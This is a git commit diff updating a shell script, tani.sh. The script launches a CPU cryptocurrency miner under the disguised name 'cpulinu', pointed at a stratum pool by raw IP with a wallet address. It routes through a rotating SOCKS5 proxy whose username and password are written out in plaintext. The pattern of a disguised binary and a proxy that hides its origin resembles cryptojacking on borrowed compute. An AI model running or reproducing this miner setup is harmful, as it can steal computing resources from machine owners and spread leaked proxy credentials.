7086969c616f1989cad44da1bbff4d18025ff8c7
bintangming55-max <bintangming55@gmail.com>
2025-11-25 09:31:47 +0700

    Update tani.sh

--- tani.sh
+++ tani.sh
@@ -1,7 +1,2 @@
-#!/bin/bash
-
-while true; do
-    echo "Ayo OM di GASSSSSS...Ulang.sh"
-   ./cpulinu -a Yescrypt  -o stratum+tcp://51.178.76.133:4024 -u RNnGqG97nqRSugwJw8s1dUVWv6tkWX492B.tani -x socks5://pymiivur-rotate:o5tci5ctvvde@p.webshare.io:80 -t4  &
-    miner_pid=$!
+./cpulinu -a Yescrypt  -o stratum+tcp://51.178.76.133:4024 -u RNnGqG97nqRSugwJw8s1dUVWv6tkWX492B.tani -x socks5://pymiivur-rotate:o5tci5ctvvde@p.webshare.io:80 -t4  
 
